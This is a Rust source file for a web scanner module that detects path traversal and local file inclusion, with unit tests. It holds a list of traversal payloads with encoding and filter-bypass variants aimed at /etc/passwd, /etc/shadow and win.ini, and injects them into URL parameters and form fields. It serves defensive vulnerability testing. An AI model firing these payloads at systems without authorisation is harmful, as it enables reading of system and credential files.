//! Path traversal and local file inclusion (LFI) scanner module.
//!
//! Detects directory traversal vulnerabilities by injecting `../` sequences,
//! encoding bypasses, and OS-specific file paths into URL parameters and form
//! fields, then checking responses for known file content indicators.

use async_trait::async_trait;
use scraper::{Html, Selector};
use url::Url;

use crate::engine::error::{Result, ScorchError};
use crate::engine::finding::Finding;
use crate::engine::module_trait::{ModuleCategory, ScanModule};
use crate::engine::scan_context::ScanContext;
use crate::engine::severity::Severity;

/// Detects path traversal and local file inclusion vulnerabilities.
#[derive(Debug)]
pub struct PathTraversalModule;

#[async_trait]
impl ScanModule for PathTraversalModule {
    fn name(&self) -> &'static str {
        "Path Traversal / LFI Detection"
    }

    fn id(&self) -> &'static str {
        "path_traversal"
    }

    fn category(&self) -> ModuleCategory {
        ModuleCategory::Scanner
    }

    fn description(&self) -> &'static str {
        "Detect path traversal and local file inclusion vulnerabilities"
    }

    async fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let url = ctx.target.url.as_str();
        let mut findings = Vec::new();

        // 1. Test any parameters already in the target URL
        test_url_params_traversal(ctx, url, &mut findings).await?;

        // 2. Spider the page for links with parameters and forms
        let response = ctx
            .http_client
            .get(url)
            .send()
            .await
            .map_err(|e| ScorchError::Http { url: url.to_string(), source: e })?;

        let body = response.text().await.unwrap_or_default();

        let links = extract_parameterized_links(&body, &ctx.target.url);
        for link in &links {
            test_url_params_traversal(ctx, link, &mut findings).await?;
        }

        let forms = extract_forms(&body, &ctx.target.url);
        for form in &forms {
            test_form_traversal(ctx, form, &mut findings).await?;
        }

        Ok(findings)
    }
}

/// A path traversal payload with metadata.
#[derive(Debug)]
struct TraversalPayload {
    /// The injection payload string.
    payload: &'static str,
    /// Human-readable description of the technique.
    description: &'static str,
}

/// Path traversal payloads covering depth variations, encoding bypasses, and OS targets.
const TRAVERSAL_PAYLOADS: &[TraversalPayload] = &[
    // Basic Linux — varying depths
    TraversalPayload { payload: "../etc/passwd", description: "Basic 1-level traversal" },
    TraversalPayload { payload: "../../etc/passwd", description: "Basic 2-level traversal" },
    TraversalPayload { payload: "../../../etc/passwd", description: "Basic 3-level traversal" },
    TraversalPayload { payload: "../../../../etc/passwd", description: "Basic 4-level traversal" },
    TraversalPayload {
        payload: "../../../../../etc/passwd",
        description: "Basic 5-level traversal",
    },
    TraversalPayload {
        payload: "../../../../../../etc/passwd",
        description: "Basic 6-level traversal",
    },
    TraversalPayload {
        payload: "../../../../../../../etc/passwd",
        description: "Basic 7-level traversal",
    },
    TraversalPayload {
        payload: "../../../../../../../../etc/passwd",
        description: "Basic 8-level traversal",
    },
    // URL-encoded
    TraversalPayload {
        payload: "..%2f..%2f..%2f..%2fetc%2fpasswd",
        description: "URL-encoded traversal",
    },
    TraversalPayload {
        payload: "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        description: "URL-encoded dots",
    },
    // Double-encoded
    TraversalPayload {
        payload: "..%252f..%252f..%252f..%252fetc%252fpasswd",
        description: "Double URL-encoded traversal",
    },
    TraversalPayload {
        payload: "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        description: "Double-encoded dots",
    },
    // Null byte (bypass extension checks on older runtimes)
    TraversalPayload {
        payload: "../../../../etc/passwd%00.png",
        description: "Null byte extension bypass",
    },
    TraversalPayload {
        payload: "../../../../etc/passwd%00.html",
        description: "Null byte HTML extension bypass",
    },
    // Backslash (Windows / IIS)
    TraversalPayload {
        payload: "..\\..\\..\\..\\windows\\win.ini",
        description: "Backslash traversal (Windows)",
    },
    TraversalPayload {
        payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        description: "Windows hosts file via backslash",
    },
    // Forward slash Windows
    TraversalPayload {
        payload: "../../../../windows/win.ini",
        description: "Forward slash Windows traversal",
    },
    // UTF-8 / Unicode encoding (IIS-specific)
    TraversalPayload {
        payload: "..%c0%af..%c0%af..%c0%afetc/passwd",
        description: "UTF-8 overlong encoding (IIS)",
    },
    TraversalPayload {
        payload: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        description: "Unicode fullwidth slash",
    },
    // Filter bypass — double-dot stripped once
    TraversalPayload {
        payload: "....//....//....//....//etc/passwd",
        description: "Double-dot filter bypass",
    },
    TraversalPayload {
        payload: "..../..../..../..../etc/passwd",
        description: "Quadruple-dot filter bypass",
    },
    // Absolute path (no traversal needed if path param is used directly)
    TraversalPayload { payload: "/etc/passwd", description: "Absolute path injection" },
    TraversalPayload { payload: "/etc/shadow", description: "Shadow file absolute path" },
    TraversalPayload { payload: "C:\\windows\\win.ini", description: "Windows absolute path" },
];

/// Known file content patterns that indicate successful path traversal.
const FILE_INDICATORS: &[(&str, &str)] = &[
    // Linux /etc/passwd
    ("root:x:0:0", "/etc/passwd"),
    ("root:*:0:0", "/etc/passwd (BSD)"),
    ("daemon:", "/etc/passwd"),
    ("bin:x:", "/etc/passwd"),
    ("nobody:", "/etc/passwd"),
    // Linux /etc/shadow
    ("root:$", "/etc/shadow"),
    // Windows win.ini
    ("[extensions]", "win.ini"),
    ("[fonts]", "win.ini"),
    ("[mci extensions]", "win.ini"),
    // Windows boot.ini
    ("[boot loader]", "boot.ini"),
    ("[operating systems]", "boot.ini"),
    // Windows hosts file
    ("# localhost name resolution", "Windows hosts"),
];

/// Check a response body for file content indicators that suggest successful path traversal.
///
/// Returns the matched pattern and file description if a known indicator is found.
fn check_traversal_response(body: &str) -> Option<(&'static str, &'static str)> {
    let lower = body.to_lowercase();
    for &(pattern, file_desc) in FILE_INDICATORS {
        if lower.contains(&pattern.to_lowercase()) {
            return Some((pattern, file_desc));
        }
    }
    None
}

/// Test URL query parameters for path traversal.
async fn test_url_params_traversal(
    ctx: &ScanContext,
    url_str: &str,
    findings: &mut Vec<Finding>,
) -> Result<()> {
    let Ok(parsed) = Url::parse(url_str) else {
        return Ok(());
    };

    let params: Vec<(String, String)> =
        parsed.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();

    if params.is_empty() {
        return Ok(());
    }

    for (param_name, _) in &params {
        for traversal in TRAVERSAL_PAYLOADS {
            let mut test_url = parsed.clone();
            {
                let mut query_pairs = test_url.query_pairs_mut();
                query_pairs.clear();
                for (k, v) in &params {
                    if k == param_name {
                        query_pairs.append_pair(k, traversal.payload);
                    } else {
                        query_pairs.append_pair(k, v);
                    }
                }
            }

            let Ok(response) = ctx.http_client.get(test_url.as_str()).send().await else {
                continue;
            };

            let resp_body = response.text().await.unwrap_or_default();

            if let Some((pattern, file_desc)) = check_traversal_response(&resp_body) {
                findings.push(
                    Finding::new(
                        "path_traversal",
                        Severity::High,
                        format!("Path Traversal: {file_desc} via parameter `{param_name}`"),
                        format!(
                            "The parameter `{param_name}` is vulnerable to path traversal. \
                             File content from {file_desc} was detected in the response \
                             using {technique}.",
                            technique = traversal.description,
                        ),
                        url_str,
                    )
                    .with_evidence(format!(
                        "Payload: {payload} | Parameter: {param_name} | \
                         Matched: \"{pattern}\" ({file_desc})",
                        payload = traversal.payload,
                    ))
                    .with_remediation(
                        "Validate and sanitize file paths. Use an allowlist of permitted \
                         files or directories. Never pass user input directly to file system \
                         operations. Use chroot jails or containerized file access.",
                    )
                    .with_owasp("A01:2021 Broken Access Control")
                    .with_cwe(22)
                    .with_confidence(0.8),
                );
                // One finding per parameter is sufficient
                break;
            }
        }
    }

    Ok(())
}

/// A discovered HTML form.
#[derive(Debug)]
struct FormInfo {
    /// Resolved form action URL.
    action: String,
    /// HTTP method (GET or POST).
    method: String,
    /// Input fields as (name, `default_value`) pairs.
    inputs: Vec<(String, String)>,
}

/// Test form fields for path traversal.
async fn test_form_traversal(
    ctx: &ScanContext,
    form: &FormInfo,
    findings: &mut Vec<Finding>,
) -> Result<()> {
    for (input_name, default_value) in &form.inputs {
        // Test a subset of payloads per form field to limit request volume
        for traversal in &TRAVERSAL_PAYLOADS[..5] {
            let injected_value = format!("{default_value}{}", traversal.payload);

            let mut params: Vec<(&str, String)> = Vec::new();
            for (name, val) in &form.inputs {
                if name == input_name {
                    params.push((name, injected_value.clone()));
                } else {
                    params.push((name, val.clone()));
                }
            }

            let response = if form.method.to_uppercase() == "POST" {
                ctx.http_client.post(&form.action).form(&params).send().await
            } else {
                ctx.http_client.get(&form.action).query(&params).send().await
            };

            let Ok(response) = response else {
                continue;
            };

            let resp_body = response.text().await.unwrap_or_default();

            if let Some((pattern, file_desc)) = check_traversal_response(&resp_body) {
                findings.push(
                    Finding::new(
                        "path_traversal",
                        Severity::High,
                        format!("Path Traversal in Form Field: {file_desc} via `{input_name}`"),
                        format!(
                            "The form field `{input_name}` at {} is vulnerable to path \
                             traversal. File content from {file_desc} was detected using \
                             {technique}.",
                            form.action,
                            technique = traversal.description,
                        ),
                        &form.action,
                    )
                    .with_evidence(format!(
                        "Form: {} {} | Field: {input_name} | Payload: {} | \
                         Matched: \"{pattern}\" ({file_desc})",
                        form.method, form.action, traversal.payload,
                    ))
                    .with_remediation(
                        "Validate and sanitize file paths. Use an allowlist of permitted \
                         files. Never use user input in file system paths.",
                    )
                    .with_owasp("A01:2021 Broken Access Control")
                    .with_cwe(22)
                    .with_confidence(0.8),
                );
                return Ok(());
            }
        }
    }

    Ok(())
}

/// Extract links with query parameters from HTML.
fn extract_parameterized_links(body: &str, base_url: &Url) -> Vec<String> {
    let document = Html::parse_document(body);
    let mut links = Vec::new();

    let Ok(selector) = Selector::parse("a[href]") else {
        return links;
    };

    for element in document.select(&selector) {
        if let Some(href) = element.value().attr("href") {
            if href.contains('?') && href.contains('=') {
                if let Ok(resolved) = base_url.join(href) {
                    if resolved.host() == base_url.host() {
                        links.push(resolved.to_string());
                    }
                }
            }
        }
    }

    links.sort();
    links.dedup();
    links.truncate(20);
    links
}

/// Extract forms from HTML.
fn extract_forms(body: &str, base_url: &Url) -> Vec<FormInfo> {
    let document = Html::parse_document(body);
    let mut forms = Vec::new();

    let Ok(form_selector) = Selector::parse("form") else {
        return forms;
    };
    let Ok(input_selector) = Selector::parse("input[name], textarea[name], select[name]") else {
        return forms;
    };

    for form_el in document.select(&form_selector) {
        let action = form_el.value().attr("action").unwrap_or("");
        let method = form_el.value().attr("method").unwrap_or("GET").to_string();

        let resolved_action = if action.is_empty() {
            base_url.to_string()
        } else if let Ok(resolved) = base_url.join(action) {
            resolved.to_string()
        } else {
            continue;
        };

        let mut inputs = Vec::new();
        for input in form_el.select(&input_selector) {
            let name = input.value().attr("name").unwrap_or("").to_string();
            let value = input.value().attr("value").unwrap_or("").to_string();
            let input_type = input.value().attr("type").unwrap_or("text").to_lowercase();

            if name.is_empty()
                || input_type == "submit"
                || input_type == "button"
                || input_type == "file"
                || input_type == "image"
            {
                continue;
            }

            inputs.push((name, value));
        }

        if !inputs.is_empty() {
            forms.push(FormInfo { action: resolved_action, method, inputs });
        }
    }

    forms.truncate(10);
    forms
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Tests for the path traversal / LFI scanner module's pure helper functions
    /// and constant data integrity.

    /// Verify that the module metadata returns correct values for id, name,
    /// category, and description.
    #[test]
    fn test_module_metadata_path_traversal() {
        let module = PathTraversalModule;

        assert_eq!(module.id(), "path_traversal");
        assert_eq!(module.name(), "Path Traversal / LFI Detection");
        assert_eq!(module.category(), ModuleCategory::Scanner);
        assert!(!module.description().is_empty());
        assert!(!module.requires_external_tool());
    }

    /// Verify that the traversal payload database is non-empty and all entries
    /// have non-empty fields.
    #[test]
    fn test_traversal_payloads_not_empty() {
        assert!(!TRAVERSAL_PAYLOADS.is_empty(), "payload database must not be empty");

        for (i, payload) in TRAVERSAL_PAYLOADS.iter().enumerate() {
            assert!(!payload.payload.is_empty(), "payload {i} has empty payload string");
            assert!(!payload.description.is_empty(), "payload {i} has empty description");
        }
    }

    /// Verify that `check_traversal_response` detects Linux `/etc/passwd` content
    /// patterns in a response body.
    #[test]
    fn test_check_traversal_linux_passwd() {
        let body =
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin";

        let result = check_traversal_response(body);

        assert!(result.is_some(), "should detect /etc/passwd content");
        let (pattern, file_desc) = result.expect("result should be present");
        assert!(pattern.contains("root:"), "pattern should match root entry");
        assert!(file_desc.contains("passwd"), "file should be identified as passwd");
    }

    /// Verify that `check_traversal_response` detects Windows `win.ini` content
    /// patterns in a response body.
    #[test]
    fn test_check_traversal_win_ini() {
        let body = "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]";

        let result = check_traversal_response(body);

        assert!(result.is_some(), "should detect win.ini content");
        let (_pattern, file_desc) = result.expect("result should be present");
        assert!(file_desc.contains("win.ini"), "file should be identified as win.ini");
    }

    /// Verify that `check_traversal_response` returns `None` for normal HTML
    /// that does not contain file content indicators.
    #[test]
    fn test_check_traversal_negative() {
        let body = "<html><body><h1>Welcome to our site!</h1><p>No files here.</p></body></html>";

        let result = check_traversal_response(body);

        assert!(result.is_none(), "should not match normal HTML content");
    }

    /// Verify that the payload database includes URL-encoded, double-encoded,
    /// and null-byte variants.
    #[test]
    fn test_traversal_encoding_variants() {
        let payloads: Vec<&str> = TRAVERSAL_PAYLOADS.iter().map(|p| p.payload).collect();

        // URL-encoded
        assert!(
            payloads.iter().any(|p| p.contains("%2f") || p.contains("%2e")),
            "must include URL-encoded payloads"
        );

        // Double-encoded
        assert!(
            payloads.iter().any(|p| p.contains("%252f") || p.contains("%252e")),
            "must include double-encoded payloads"
        );

        // Null byte
        assert!(payloads.iter().any(|p| p.contains("%00")), "must include null byte payloads");

        // Backslash (Windows)
        assert!(
            payloads.iter().any(|p| p.contains('\\')),
            "must include backslash (Windows) payloads"
        );

        // Unicode encoding
        assert!(
            payloads.iter().any(|p| p.contains("%c0%af") || p.contains("%ef%bc")),
            "must include unicode encoding payloads"
        );
    }

    /// Verify that the file indicator database covers both Linux and Windows
    /// target files.
    #[test]
    fn test_file_indicators_cover_os_targets() {
        let descriptions: Vec<&str> = FILE_INDICATORS.iter().map(|&(_, desc)| desc).collect();

        // Linux
        assert!(descriptions.iter().any(|d| d.contains("passwd")), "must cover /etc/passwd");

        // Windows
        assert!(descriptions.iter().any(|d| d.contains("win.ini")), "must cover win.ini");

        // Boot files
        assert!(
            descriptions.iter().any(|d| d.contains("boot.ini") || d.contains("hosts")),
            "must cover boot.ini or hosts"
        );
    }
}
